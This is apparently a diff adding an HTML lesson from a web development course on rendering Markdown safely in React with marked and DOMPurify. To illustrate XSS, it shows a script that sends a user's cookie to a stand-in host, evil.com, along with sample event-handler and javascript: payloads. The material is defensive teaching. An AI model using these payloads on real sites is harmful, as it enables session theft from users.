@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lesson 44: Markdown Rendering &amp; Content Display | Full-Stack Web Development Curriculum</title>
+  <link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+
+<!-- ── TOP NAV ── -->
+<nav class="lesson-nav">
+  <a href="43-realtime-updates.html">&larr; Previous</a>
+  <span>Lesson 44 of 56</span>
+  <a href="45-print-document-generation.html">Next &rarr;</a>
+</nav>
+
+<!-- ── HEADER ── -->
+<header class="lesson-header" style="background: linear-gradient(135deg, #7e22ce 0%, #d946ef 100%);">
+  <span class="phase-badge" style="background: rgba(217,70,239,0.3);">Phase 10: Advanced UI Patterns</span>
+  <h1>Markdown Rendering &amp; Content Display</h1>
+  <p class="lesson-subtitle">Store content as simple Markdown text, then transform it into beautiful, safe HTML for your users.</p>
+</header>
+
+<!-- ── MAIN CONTENT ── -->
+<main class="lesson-content">
+
+  <!-- Learning Objectives -->
+  <section class="learning-objectives">
+    <h2>What You Will Learn</h2>
+    <ul>
+      <li>What Markdown is and why it is the standard for developer content</li>
+      <li>Core Markdown syntax: headings, emphasis, links, images, lists, code, blockquotes, and tables</li>
+      <li>Why storing content as Markdown is better than storing HTML</li>
+      <li>Using the <code>marked</code> library to convert Markdown to HTML</li>
+      <li>Rendering raw HTML in React with <code>dangerouslySetInnerHTML</code></li>
+      <li>Why the name is "dangerous" and the XSS risk it represents</li>
+      <li>Sanitizing HTML with DOMPurify to prevent cross-site scripting attacks</li>
+      <li>Styling rendered Markdown with a prose or markdown-content CSS class</li>
+      <li>Syntax highlighting for code blocks with highlight.js</li>
+      <li>Building a content pipeline: write Markdown, store in DB, fetch, parse, render</li>
+      <li>Creating a live Markdown preview with a split editor/preview layout</li>
+    </ul>
+  </section>
+
+  <!-- ────────────────────────────────────────── -->
+  <h2>What Is Markdown?</h2>
+
+  <p>Markdown is a lightweight markup language created by John Gruber in 2004. Its purpose is simple: let people write formatted text using plain characters that are easy to read even before they are converted to HTML. Instead of writing <code>&lt;h1&gt;My Title&lt;/h1&gt;</code>, you write <code># My Title</code>. Instead of <code>&lt;strong&gt;bold&lt;/strong&gt;</code>, you write <code>**bold**</code>. The Markdown source is readable as-is, which makes it perfect for content that gets stored in databases, version-controlled in Git, or edited in simple text fields.</p>
+
+  <p>Markdown has become the universal language for developer content. GitHub uses it for README files and issues. Stack Overflow uses it for questions and answers. Most documentation sites, blog platforms, and content management systems support Markdown. If you learn it once, you can write content for hundreds of platforms.</p>
+
+  <div class="analogy">
+    <strong>Analogy:</strong> Markdown is like shorthand for HTML. Just as a court reporter uses shorthand symbols to write faster than longhand, Markdown uses simple characters like <code>#</code>, <code>*</code>, and <code>-</code> to represent HTML elements. The shorthand is faster to write and easier to read, but it converts to the same final product.
+  </div>
+
+  <!-- ────────────────────────────────────────── -->
+  <h2>Markdown Syntax Reference</h2>
+
+  <p>Here is a complete reference of the Markdown syntax you will use most often. On the left is what you type, and on the right is what it produces.</p>
+
+  <h3>Headings</h3>
+
+  <p>Headings use the <code>#</code> character. More hashes means a smaller heading, just like HTML's <code>&lt;h1&gt;</code> through <code>&lt;h6&gt;</code>.</p>
+
+  <pre><code># Heading 1        &rarr;  &lt;h1&gt;Heading 1&lt;/h1&gt;
+## Heading 2       &rarr;  &lt;h2&gt;Heading 2&lt;/h2&gt;
+### Heading 3      &rarr;  &lt;h3&gt;Heading 3&lt;/h3&gt;
+#### Heading 4     &rarr;  &lt;h4&gt;Heading 4&lt;/h4&gt;
+##### Heading 5    &rarr;  &lt;h5&gt;Heading 5&lt;/h5&gt;
+###### Heading 6   &rarr;  &lt;h6&gt;Heading 6&lt;/h6&gt;</code></pre>
+
+  <h3>Text Emphasis</h3>
+
+  <pre><code>*italic text*          &rarr;  &lt;em&gt;italic text&lt;/em&gt;
+**bold text**          &rarr;  &lt;strong&gt;bold text&lt;/strong&gt;
+***bold and italic***  &rarr;  &lt;strong&gt;&lt;em&gt;bold and italic&lt;/em&gt;&lt;/strong&gt;
+~~strikethrough~~      &rarr;  &lt;del&gt;strikethrough&lt;/del&gt;</code></pre>
+
+  <h3>Links and Images</h3>
+
+  <pre><code>// Links: [visible text](URL)
+[Visit Google](https://google.com)
+&rarr; &lt;a href="https://google.com"&gt;Visit Google&lt;/a&gt;
+
+// Images: ![alt text](image URL)
+![A cute cat](https://example.com/cat.jpg)
+&rarr; &lt;img src="https://example.com/cat.jpg" alt="A cute cat"&gt;</code></pre>
+
+  <p>The syntax for links and images is almost identical. Images just have an exclamation mark <code>!</code> in front. The text in square brackets becomes the alt text for accessibility.</p>
+
+  <h3>Lists</h3>
+
+  <pre><code>// Unordered list (use -, *, or +)
+- First item
+- Second item
+  - Nested item
+  - Another nested item
+- Third item
+
+// Ordered list
+1. First step
+2. Second step
+3. Third step</code></pre>
+
+  <p>Ordered lists are numbered, and Markdown will auto-number them even if you write <code>1.</code> for every item. Nested items are created by indenting with two or four spaces.</p>
+
+  <h3>Code</h3>
+
+  <pre><code>// Inline code uses single backticks
+Use the `useState` hook for state management.
+
+// Code blocks use triple backticks with an optional language
+```javascript
+function greet(name) {
+  return `Hello, ${name}!`;
+}
+```
+
+```css
+.container {
+  max-width: 800px;
+  margin: 0 auto;
+}
+```</code></pre>
+
+  <p>The language identifier after the opening triple backticks (like <code>javascript</code> or <code>css</code>) tells syntax highlighting tools which language to use. This is how developer documentation gets colorful code blocks.</p>
+
+  <h3>Blockquotes</h3>
+
+  <pre><code>&gt; This is a blockquote. It is used for callouts,
+&gt; quoted text, or important notes.
+&gt;
+&gt; It can span multiple paragraphs.</code></pre>
+
+  <h3>Tables</h3>
+
+  <pre><code>| Name     | Role        | Status   |
+|----------|-------------|----------|
+| Alice    | Developer   | Active   |
+| Bob      | Designer    | Active   |
+| Charlie  | Manager     | Away     |</code></pre>
+
+  <p>The dashes <code>---</code> separate the header row from the body. Column alignment can be controlled with colons: <code>:---</code> for left, <code>:---:</code> for center, <code>---:</code> for right.</p>
+
+  <h3>Horizontal Rules</h3>
+
+  <pre><code>---
+***
+___</code></pre>
+
+  <p>Three or more dashes, asterisks, or underscores create a horizontal line (<code>&lt;hr&gt;</code>), useful for separating sections.</p>
+
+  <!-- ────────────────────────────────────────── -->
+  <h2>Why Store Content as Markdown?</h2>
+
+  <p>You might wonder: if the browser needs HTML, why not just store HTML in the database? There are several compelling reasons to store Markdown instead.</p>
+
+  <ul>
+    <li><strong>Simplicity for writers:</strong> Content authors do not need to know HTML. Markdown is simple enough to learn in 10 minutes. Blog posts, documentation, and product descriptions can be written by anyone on the team.</li>
+    <li><strong>Smaller storage:</strong> <code># Hello World</code> is much shorter than <code>&lt;h1 class="title"&gt;Hello World&lt;/h1&gt;</code>. Over thousands of blog posts, the storage difference adds up.</li>
+    <li><strong>Portability:</strong> Markdown content works everywhere. If you switch from one blog platform to another, your Markdown files transfer directly. HTML often contains platform-specific classes and structures that do not port well.</li>
+    <li><strong>Safety:</strong> Markdown is plain text. It does not contain executable scripts. When you store HTML in a database, you risk storing malicious <code>&lt;script&gt;</code> tags that could attack your users. Markdown eliminates this risk at the storage level.</li>
+    <li><strong>Flexible rendering:</strong> The same Markdown content can be rendered differently for different contexts. Your website might add one set of CSS classes, your email system another, and your PDF generator yet another. The source content does not need to change.</li>
+  </ul>
+
+  <div class="csk-connection">
+    <strong>CSK Connection</strong>
+    The Computer Store KS blog stores all post content as Markdown in the <code>blog_posts.content</code> column in Supabase. When an admin writes a blog post in the admin editor, they write Markdown. When a customer visits <code>/blog/[slug]</code>, the server fetches the Markdown string, converts it to HTML using the <code>marked</code> library, and renders it on the page. This means blog content is easy to write, safe to store, and beautiful to display.
+  </div>
+
+  <!-- ────────────────────────────────────────── -->
+  <h2>The <code>marked</code> Library: Converting Markdown to HTML</h2>
+
+  <p><code>marked</code> is one of the most popular JavaScript libraries for converting Markdown text to HTML. It is fast, configurable, and supports the full CommonMark specification plus extensions like tables and task lists.</p>
+
+  <h3>Installation</h3>
+
+  <pre><code>npm install marked</code></pre>
+
+  <h3>Basic Usage</h3>
+
+  <pre><code>import { marked } from 'marked';
+
+const markdown = `
+# Welcome to Our Blog
+
+This is a **blog post** about building web applications.
+
+## Key Topics
+
+- React components
+- TypeScript basics
+- Database design
+
+Here is some code:
+
+\`\`\`javascript
+const greeting = "Hello, World!";
+console.log(greeting);
+\`\`\`
+`;
+
+const html = marked.parse(markdown);
+console.log(html);</code></pre>
+
+  <p>The output of <code>marked.parse()</code> is a string of HTML:</p>
+
+  <pre><code>&lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+&lt;p&gt;This is a &lt;strong&gt;blog post&lt;/strong&gt; about building web applications.&lt;/p&gt;
+&lt;h2&gt;Key Topics&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;React components&lt;/li&gt;
+&lt;li&gt;TypeScript basics&lt;/li&gt;
+&lt;li&gt;Database design&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Here is some code:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-javascript"&gt;const greeting = "Hello, World!";
+console.log(greeting);
+&lt;/code&gt;&lt;/pre&gt;</code></pre>
+
+  <h3>Configuration Options</h3>
+
+  <pre><code>import { marked } from 'marked';
+
+// Configure marked globally
+marked.setOptions({
+  breaks: true,      // Convert \n to &lt;br&gt; (single newlines become line breaks)
+  gfm: true,         // GitHub Flavored Markdown (tables, task lists, etc.)
+});
+
+// Or configure per-call
+const html = marked.parse(markdown, {
+  breaks: true,
+  gfm: true,
+});</code></pre>
+
+  <p>The <code>breaks: true</code> option is important for user-generated content. By default, Markdown requires a blank line to create a new paragraph. With <code>breaks: true</code>, a single newline creates a <code>&lt;br&gt;</code>, which is what most users expect when they press Enter.</p>
+
+  <!-- ────────────────────────────────────────── -->
+  <h2>Rendering HTML in React: <code>dangerouslySetInnerHTML</code></h2>
+
+  <p>By default, React escapes all HTML in JSX to prevent security issues. If you write <code>&lt;p&gt;{htmlString}&lt;/p&gt;</code>, React will display the literal HTML tags as text, not render them. To render a raw HTML string, you must use the <code>dangerouslySetInnerHTML</code> prop.</p>
+
+  <pre><code>function BlogPost({ content }) {
+  // Convert Markdown to HTML
+  const html = marked.parse(content);
+
+  return (
+    &lt;article
+      className="prose"
+      dangerouslySetInnerHTML={{ __html: html }}
+    /&gt;
+  );
+}</code></pre>
+
+  <p>The prop's name is intentionally alarming: <code>dangerouslySetInnerHTML</code>. React's developers chose this name to make you stop and think before using it. The <code>{{ __html: html }}</code> syntax is also deliberately awkward. These are design decisions meant to communicate: "This bypasses React's built-in XSS protection. Are you sure?"</p>
+
+  <h3>Why Is It Dangerous?</h3>
+
+  <p>Cross-site scripting (XSS) is one of the most common web security vulnerabilities. It happens when an attacker injects malicious JavaScript into a page that other users view. If your blog allows Markdown content and someone writes:</p>
+
+  <pre><code># Innocent Blog Post
+
+Here is some helpful content.
+
+&lt;script&gt;
+  // This script steals the user's session cookie
+  // and sends it to the attacker's server
+  fetch('https://evil.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;</code></pre>
+
+  <p>If you convert this Markdown to HTML with <code>marked</code> and render it with <code>dangerouslySetInnerHTML</code> without sanitization, the <code>&lt;script&gt;</code> tag will execute in every reader's browser. The attacker can steal session tokens, redirect users, or modify the page content.</p>
+
+  <div class="warning-box">
+    <strong>Never Render Unsanitized User Content</strong>
+    If the Markdown comes from user input (blog posts, comments, forum posts, ticket notes), you <strong>must</strong> sanitize the HTML before rendering it. The <code>marked</code> library converts Markdown to HTML but does <strong>not</strong> sanitize it. You need a separate sanitization step. Even if you trust your current users, sanitization protects against compromised accounts, copy-paste accidents, and future changes in who can submit content.
+  </div>
+
+  <!-- ────────────────────────────────────────── -->
+  <h2>HTML Sanitization with DOMPurify</h2>
+
+  <p>DOMPurify is the most widely used HTML sanitization library. It takes an HTML string and removes anything dangerous: <code>&lt;script&gt;</code> tags, event handlers like <code>onclick</code>, suspicious URLs, and other XSS vectors. Everything else passes through untouched.</p>
+
+  <h3>Installation</h3>
+
+  <pre><code>npm install dompurify
+npm install --save-dev @types/dompurify  # TypeScript types</code></pre>
+
+  <h3>Basic Usage</h3>
+
+  <pre><code>import DOMPurify from 'dompurify';
+import { marked } from 'marked';
+
+function renderMarkdown(markdownString) {
+  // Step 1: Convert Markdown to HTML
+  const rawHtml = marked.parse(markdownString);
+
+  // Step 2: Sanitize the HTML (remove dangerous elements)
+  const cleanHtml = DOMPurify.sanitize(rawHtml);
+
+  return cleanHtml;
+}</code></pre>
+
+  <h3>What DOMPurify Removes</h3>
+
+  <pre><code>const dirty = `
+  &lt;h1&gt;Hello&lt;/h1&gt;
+  &lt;p onclick="alert('hacked')"&gt;Click me&lt;/p&gt;
+  &lt;script&gt;alert('xss')&lt;/script&gt;
+  &lt;img src="x" onerror="alert('xss')"&gt;
+  &lt;a href="javascript:alert('xss')"&gt;Click&lt;/a&gt;
+  &lt;style&gt;body { display: none; }&lt;/style&gt;
+`;
+
+const clean = DOMPurify.sanitize(dirty);
+console.log(clean);
+
+// Output:
+// &lt;h1&gt;Hello&lt;/h1&gt;
+// &lt;p&gt;Click me&lt;/p&gt;
+//
+// &lt;img src="x"&gt;
+// &lt;a&gt;Click&lt;/a&gt;
+//</code></pre>
+
+  <p>DOMPurify removed the <code>&lt;script&gt;</code> tag entirely, stripped the <code>onclick</code> and <code>onerror</code> event handlers, removed the <code>javascript:</code> URL from the link, and removed the <code>&lt;style&gt;</code> tag. The safe content (headings, paragraphs, images) passes through.</p>
+
+  <h3>Configuration Options</h3>
+
+  <pre><code>// Allow only specific tags
+const clean = DOMPurify.sanitize(dirty, {
+  ALLOWED_TAGS: ['h1', 'h2', 'h3', 'p', 'a', 'ul', 'ol', 'li',
+                 'strong', 'em', 'code', 'pre', 'blockquote',
+                 'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td'],
+  ALLOWED_ATTR: ['href', 'src', 'alt', 'class'],
+});
+
+// Allow target="_blank" on links
+const clean = DOMPurify.sanitize(dirty, {
+  ADD_ATTR: ['target'],
+});</code></pre>
+
+  <h3>The Complete Safe Rendering Pattern</h3>
+
+  <pre><code>import DOMPurify from 'dompurify';
+import { marked } from 'marked';
+
+function BlogPostContent({ markdownContent }) {
+  // Convert Markdown to HTML, then sanitize
+  const html = DOMPurify.sanitize(
+    marked.parse(markdownContent)
+  );
+
+  return (
+    &lt;article
+      className="markdown-content"
+      dangerouslySetInnerHTML={{ __html: html }}
+    /&gt;
+  );
+}</code></pre>
+
+  <p>This three-step pipeline &mdash; Markdown in, HTML out, sanitize before render &mdash; is the standard pattern used across the industry. It gives you the simplicity of Markdown authoring with the safety of sanitized output.</p>
+
+  <div class="info-box">
+    <strong>Server-Side Rendering Note</strong>
+    DOMPurify uses the browser's DOM API. In a Next.js application with server-side rendering, you need to use <code>isomorphic-dompurify</code> (a wrapper that works on both server and client) or only run DOMPurify on the client side. For server components, you can use the <code>sanitize-html</code> package as an alternative that works without a DOM.
+  </div>
+
+  <!-- ────────────────────────────────────────── -->
+  <h2>Styling Rendered Markdown</h2>
+
+  <p>When <code>marked</code> converts Markdown to HTML, the output uses bare HTML tags: <code>&lt;h1&gt;</code>, <code>&lt;p&gt;</code>, <code>&lt;ul&gt;</code>, <code>&lt;pre&gt;</code>. These tags have browser default styles, which look plain and inconsistent. You need a CSS class that applies beautiful, readable styling to the rendered HTML.</p>
+
+  <h3>The <code>.markdown-content</code> CSS Pattern</h3>
+
+  <pre><code>/* Apply to the container wrapping the rendered HTML */
+.markdown-content {
+  line-height: 1.8;
+  color: #1a1a2e;
+  font-size: 1rem;
+}
+
+/* Headings */
+.markdown-content h1 {
+  font-size: 2rem;
+  font-weight: 800;
+  margin: 2rem 0 1rem;
+  padding-bottom: 0.5rem;
+  border-bottom: 2px solid #e5e7eb;
+}
+
+.markdown-content h2 {
+  font-size: 1.5rem;
+  font-weight: 700;
+  margin: 1.75rem 0 0.75rem;
+}
+
+.markdown-content h3 {
+  font-size: 1.25rem;
+  font-weight: 600;
+  margin: 1.5rem 0 0.5rem;
+}
+
+/* Paragraphs */
+.markdown-content p {
+  margin-bottom: 1.25rem;
+}
+
+/* Links */
+.markdown-content a {
+  color: #2563eb;
+  text-decoration: underline;
+}
+.markdown-content a:hover {
+  color: #1d4ed8;
+}
+
+/* Lists */
+.markdown-content ul,
+.markdown-content ol {
+  margin-bottom: 1.25rem;
+  padding-left: 1.75rem;
+}
+.markdown-content li {
+  margin-bottom: 0.5rem;
+}
+
+/* Blockquotes */
+.markdown-content blockquote {
+  border-left: 4px solid #3b82f6;
+  margin: 1.5rem 0;
+  padding: 0.75rem 1.25rem;
+  background: #eff6ff;
+  border-radius: 0 8px 8px 0;
+  color: #374151;
+}
+.markdown-content blockquote p {
+  margin-bottom: 0;
+}
+
+/* Inline code */
+.markdown-content code {
+  background: #f1f5f9;
+  color: #0f172a;
+  padding: 0.15rem 0.4rem;
+  border-radius: 4px;
+  font-size: 0.9em;
+  font-family: 'Fira Code', 'JetBrains Mono', monospace;
+}
+
+/* Code blocks */
+.markdown-content pre {
+  background: #1e1e2e;
+  color: #cdd6f4;
+  padding: 1.25rem 1.5rem;
+  border-radius: 10px;
+  overflow-x: auto;
+  margin: 1.5rem 0;
+  line-height: 1.6;
+}
+.markdown-content pre code {
+  background: none;
+  color: inherit;
+  padding: 0;
+  font-size: 0.88rem;
+}
+
+/* Images */
+.markdown-content img {
+  max-width: 100%;
+  height: auto;
+  border-radius: 8px;
+  margin: 1.5rem 0;
+}
+
+/* Tables */
+.markdown-content table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1.5rem 0;
+}
+.markdown-content th,
+.markdown-content td {
+  padding: 0.75rem 1rem;
+  border: 1px solid #e5e7eb;
+  text-align: left;
+}
+.markdown-content th {
+  background: #f8fafc;
+  font-weight: 700;
+}
+
+/* Horizontal rules */
+.markdown-content hr {
+  border: none;
+  border-top: 2px solid #e5e7eb;
+  margin: 2rem 0;
+}</code></pre>
+
+  <p>This set of styles transforms bare HTML into polished, readable content. The key idea is that every style targets elements <em>inside</em> the <code>.markdown-content</code> container. This scoping prevents the markdown styles from leaking into the rest of your application. Outside this container, your <code>&lt;h2&gt;</code> elements might look completely different, and that is fine.</p>
+
+  <div class="info-box">
+    <strong>Tailwind CSS Typography Plugin</strong>
+    If you use Tailwind CSS, the <code>@tailwindcss/typography</code> plugin provides a <code>prose</code> class that handles all of this styling automatically. Install it with <code>npm install @tailwindcss/typography</code>, add it to your Tailwind config, then use <code>className="prose"</code> on your container. It is the same concept as our custom CSS, just pre-built by the Tailwind team.
+  </div>
+
+  <!-- ────────────────────────────────────────── -->
+  <h2>Syntax Highlighting for Code Blocks</h2>
+
+  <p>Markdown code blocks with a language identifier (like <code>```javascript</code>) convert to <code>&lt;pre&gt;&lt;code class="language-javascript"&gt;</code> in HTML. The <code>language-javascript</code> class tells a syntax highlighter which grammar to use for colorizing the code. Without a highlighter, code blocks are just monospace text. With one, they get the beautiful colored syntax you see on sites like GitHub.</p>
+
+  <h3>Using highlight.js</h3>
+
+  <pre><code>npm install highlight.js</code></pre>
+
+  <pre><code>import hljs from 'highlight.js';
+import 'highlight.js/styles/github-dark.css'; // Choose a theme
+import { marked } from 'marked';
+
+// Configure marked to use highlight.js
+marked.setOptions({
+  highlight: function(code, lang) {
+    if (lang &amp;&amp; hljs.getLanguage(lang)) {
+      return hljs.highlight(code, { language: lang }).value;
+    }
+    // Fallback: auto-detect the language
+    return hljs.highlightAuto(code).value;
+  },
+});
+
+// Now marked.parse() produces pre-highlighted HTML
+const html = marked.parse(markdownWithCode);</code></pre>
+
+  <p>highlight.js comes with dozens of themes. Popular choices include <code>github-dark</code>, <code>monokai</code>, <code>vs2015</code>, and <code>atom-one-dark</code>. Import the CSS file for your chosen theme, and the code blocks will automatically be styled.</p>
+
+  <h3>Alternative: Prism.js</h3>
+
+  <p>Prism is another popular syntax highlighter. It works similarly but has a smaller core and a plugin architecture. Either library works well. The key concept is the same: you hook the highlighter into the markdown parser so code blocks get colorized during the Markdown-to-HTML conversion.</p>
+
+  <pre><code>// With Prism (alternative approach - highlight after render)
+import Prism from 'prismjs';
+import 'prismjs/themes/prism-tomorrow.css';
+import 'prismjs/components/prism-javascript';
+import 'prismjs/components/prism-typescript';
+import 'prismjs/components/prism-css';
+
+// After rendering the HTML to the DOM:
+useEffect(() =&gt; {
+  Prism.highlightAll();
+}, [content]);</code></pre>
+
+  <!-- ────────────────────────────────────────── -->
+  <h2>Building a Blog Content Pipeline</h2>
+
+  <p>Now that you understand each piece, let us assemble the complete pipeline: Markdown is authored, stored in the database, fetched by the application, converted to HTML, sanitized, and rendered with styling and syntax highlighting.</p>
+
+  <div class="diagram">
+Author writes     Stored in DB     Fetched by app     Converted        Sanitized         Rendered
+  Markdown    &rarr;   blog_posts   &rarr;   API route     &rarr;  marked.parse()  &rarr;  DOMPurify  &rarr;  dangerouslySetInnerHTML
+  (plain text)    .content col     GET /api/blog/[id]  (raw HTML)       (safe HTML)       (styled output)
+  </div>
+
+  <h3>Server Component Implementation</h3>
+
+  <pre><code>// app/blog/[slug]/page.tsx
+import { marked } from 'marked';
+import DOMPurify from 'isomorphic-dompurify';
+import { createClient } from '@/lib/supabase';
+
+export default async function BlogPostPage({
+  params
+}: {
+  params: { slug: string }
+}) {
+  const supabase = createClient();
+
+  // Fetch the blog post by slug
+  const { data: post, error } = await supabase
+    .from('blog_posts')
+    .select('*')
+    .eq('slug', params.slug)
+    .eq('status', 'published')
+    .single();
+
+  if (!post || error) {
+    return &lt;div&gt;Post not found.&lt;/div&gt;;
+  }
+
+  // Convert Markdown to sanitized HTML
+  const contentHtml = DOMPurify.sanitize(
+    marked.parse(post.content)
+  );
+
+  return (
+    &lt;article&gt;
+      &lt;header&gt;
+        &lt;h1&gt;{post.title}&lt;/h1&gt;
+        &lt;time&gt;{new Date(post.published_at).toLocaleDateString()}&lt;/time&gt;
+        {post.category &amp;&amp; &lt;span&gt;{post.category}&lt;/span&gt;}
+      &lt;/header&gt;
+
+      {post.featured_image &amp;&amp; (
+        &lt;img
+          src={post.featured_image}
+          alt={post.title}
+          style={{ maxWidth: '100%', borderRadius: '8px' }}
+        /&gt;
+      )}
+
+      &lt;div
+        className="markdown-content"
+        dangerouslySetInnerHTML={{ __html: contentHtml }}
+      /&gt;
+    &lt;/article&gt;
+  );
+}</code></pre>
+
+  <p>This is a Next.js server component. The Markdown conversion and sanitization happen on the server, so the client receives clean, ready-to-display HTML. No JavaScript parsing happens in the user's browser, which is faster and more secure.</p>
+
+  <!-- ────────────────────────────────────────── -->
+  <h2>Live Markdown Preview: Split Editor and Preview</h2>
+
+  <p>For admin interfaces where users write Markdown, a live preview lets them see the rendered output as they type. The screen is split into two panels: a text editor on the left and a rendered preview on the right.</p>
+
+  <pre><code>'use client';
+
+import { useState, useMemo } from 'react';
+import { marked } from 'marked';
+import DOMPurify from 'dompurify';
+
+export default function MarkdownEditor({
+  initialContent = '',
+  onSave,
+}) {
+  const [markdown, setMarkdown] = useState(initialContent);
+
+  // Memoize the HTML conversion so it only recalculates when markdown changes
+  const previewHtml = useMemo(() =&gt; {
+    return DOMPurify.sanitize(marked.parse(markdown));
+  }, [markdown]);
+
+  return (
+    &lt;div className="editor-container"&gt;
+      {/* Editor Panel */}
+      &lt;div className="editor-panel"&gt;
+        &lt;div className="panel-header"&gt;
+          &lt;h3&gt;Markdown&lt;/h3&gt;
+        &lt;/div&gt;
+        &lt;textarea
+          className="editor-textarea"
+          value={markdown}
+          onChange={(e) =&gt; setMarkdown(e.target.value)}
+          placeholder="Write your content in Markdown..."
+          spellCheck={true}
+        /&gt;
+      &lt;/div&gt;
+
+      {/* Preview Panel */}
+      &lt;div className="preview-panel"&gt;
+        &lt;div className="panel-header"&gt;
+          &lt;h3&gt;Preview&lt;/h3&gt;
+        &lt;/div&gt;
+        &lt;div
+          className="markdown-content preview-content"
+          dangerouslySetInnerHTML={{ __html: previewHtml }}
+        /&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  );
+}</code></pre>
+
+  <h3>Styling the Editor</h3>
+
+  <pre><code>.editor-container {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 1px;
+  background: #e5e7eb;
+  border: 1px solid #e5e7eb;
+  border-radius: 10px;
+  overflow: hidden;
+  height: 600px;
+}
+
+.editor-panel,
+.preview-panel {
+  display: flex;
+  flex-direction: column;
+  background: white;
+}
+
+.panel-header {
+  padding: 0.75rem 1rem;
+  background: #f8fafc;
+  border-bottom: 1px solid #e5e7eb;
+}
+.panel-header h3 {
+  margin: 0;
+  font-size: 0.85rem;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  color: #6b7280;
+}
+
+.editor-textarea {
+  flex: 1;
+  padding: 1rem;
+  border: none;
+  resize: none;
+  font-family: 'Fira Code', 'JetBrains Mono', monospace;
+  font-size: 0.9rem;
+  line-height: 1.6;
+  outline: none;
+}
+
+.preview-content {
+  flex: 1;
+  padding: 1rem;
+  overflow-y: auto;
+}
+
+/* Responsive: stack on mobile */
+@media (max-width: 768px) {
+  .editor-container {
+    grid-template-columns: 1fr;
+    grid-template-rows: 1fr 1fr;
+  }
+}</code></pre>
+
+  <p>The <code>useMemo</code> hook is important here. Without it, the Markdown would be parsed on every render, even if it has not changed. With <code>useMemo</code>, the HTML is only recalculated when the <code>markdown</code> state actually changes. For short content, the difference is negligible. For long blog posts, it prevents unnecessary work.</p>
+
+  <div class="csk-connection">
+    <strong>CSK Connection</strong>
+    The CSK admin blog editor at <code>/admin/blog/new</code> and <code>/admin/blog/[id]</code> uses exactly this pattern. The editor provides a textarea for Markdown input and a preview panel that shows the rendered output. When the admin clicks "Publish," the raw Markdown is saved to the <code>blog_posts.content</code> column in Supabase. The public blog page then fetches and renders it using the pipeline described in this lesson.
+  </div>
+
+  <!-- ────────────────────────────────────────── -->
+  <h2>Complete Pipeline Example</h2>
+
+  <p>Here is a summary of every file involved in a complete Markdown blog content system:</p>
+
+  <pre><code>// 1. lib/markdown.ts - Shared markdown utilities
+import { marked } from 'marked';
+import DOMPurify from 'isomorphic-dompurify';
+
+marked.setOptions({
+  breaks: true,
+  gfm: true,
+});
+
+/**
+ * Converts a Markdown string to sanitized HTML.
+ * Safe to render with dangerouslySetInnerHTML.
+ */
+export function renderMarkdown(markdown: string): string {
+  const rawHtml = marked.parse(markdown);
+  return DOMPurify.sanitize(rawHtml);
+}
+
+
+// 2. app/blog/[slug]/page.tsx - Public blog post page
+import { renderMarkdown } from '@/lib/markdown';
+
+export default async function BlogPost({ params }) {
+  const post = await fetchPost(params.slug);
+  const html = renderMarkdown(post.content);
+
+  return (
+    &lt;article className="markdown-content"
+      dangerouslySetInnerHTML={{ __html: html }}
+    /&gt;
+  );
+}
+
+
+// 3. app/admin/blog/new/page.tsx - Admin editor
+import MarkdownEditor from '@/components/MarkdownEditor';
+
+export default function NewBlogPost() {
+  async function handleSave(content: string) {
+    await fetch('/api/blog', {
+      method: 'POST',
+      body: JSON.stringify({ title, content }), // content is raw Markdown
+    });
+  }
+
+  return &lt;MarkdownEditor onSave={handleSave} /&gt;;
+}
+
+
+// 4. app/api/blog/route.ts - API stores raw Markdown
+export async function POST(request) {
+  const { title, content } = await request.json();
+
+  // Store the raw Markdown - NOT HTML
+  await supabase.from('blog_posts').insert({
+    title,
+    content,  // Raw Markdown string
+    slug: generateSlug(title),
+  });
+}</code></pre>
+
+  <!-- ── Exercises ── -->
+  <section class="exercises">
+    <h2>Hands-On Exercises</h2>
+    <ol>
+      <li><strong>Markdown cheat sheet:</strong> Write a Markdown document that uses every syntax element covered in this lesson: all 6 heading levels, bold, italic, a link, an image, an unordered list, an ordered list, inline code, a code block with a language identifier, a blockquote, and a table. Open it in a Markdown preview tool (like VS Code's built-in preview) to see the rendered output.</li>
+      <li><strong>Markdown to HTML:</strong> Install the <code>marked</code> library. Write a Node.js script that reads a Markdown file, converts it to HTML with <code>marked.parse()</code>, and writes the result to an HTML file. Open the HTML file in a browser.</li>
+      <li><strong>XSS demonstration:</strong> Create a Markdown string that contains a <code>&lt;script&gt;alert('xss')&lt;/script&gt;</code> tag. Convert it with <code>marked.parse()</code> and inspect the output. Then pass the output through <code>DOMPurify.sanitize()</code> and compare. This exercise shows why sanitization is essential.</li>
+      <li><strong>Styled content:</strong> Create a React component that renders Markdown with the <code>.markdown-content</code> CSS styles from this lesson. Write a sample blog post in Markdown and verify that headings, code blocks, blockquotes, and tables all look polished.</li>
+      <li><strong>Live preview editor:</strong> Build the split-pane Markdown editor from this lesson. Type Markdown in the left panel and see the rendered output update in the right panel in real time. Add a "Copy HTML" button that copies the generated HTML to the clipboard.</li>
+      <li><strong>Blog content pipeline:</strong> Build a minimal blog system: an editor page that saves Markdown to an API endpoint, and a display page that fetches the Markdown, converts it to sanitized HTML, and renders it with styling. This combines everything from the lesson into one working feature.</li>
+    </ol>
+  </section>
+
+  <!-- ── Key Takeaways ── -->
+  <section class="key-takeaways">
+    <h2>Key Takeaways</h2>
+    <ul>
+      <li>Markdown is a lightweight syntax for writing formatted content that converts cleanly to HTML.</li>
+      <li>Store content as <strong>raw Markdown</strong> in the database, not HTML. Markdown is portable, safe, and flexible.</li>
+      <li>Use <code>marked.parse()</code> to convert Markdown strings to HTML strings on the server or client.</li>
+      <li><code>dangerouslySetInnerHTML</code> renders raw HTML in React. The name is a warning: it bypasses XSS protection.</li>
+      <li><strong>Always sanitize</strong> HTML from user-generated content with DOMPurify before rendering it. This prevents cross-site scripting attacks.</li>
